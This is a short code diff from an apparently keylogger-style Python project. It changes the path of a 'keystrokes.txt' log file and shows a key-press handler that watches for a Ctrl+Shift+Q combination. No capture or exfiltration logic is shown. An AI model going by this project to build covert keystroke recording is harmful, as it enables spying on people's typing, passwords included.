@@ -4,7 +4,7 @@ import time
 import os
 import signal
 
-log_file = 'keystrokes.txt'
+log_file = 'KeyLoggerApp\App\keyloggerLogs\keystrokes.txt'
 
 def on_key_press(event):
     if keyboard.is_pressed('ctrl') and keyboard.is_pressed('shift') and keyboard.is_pressed('q'):
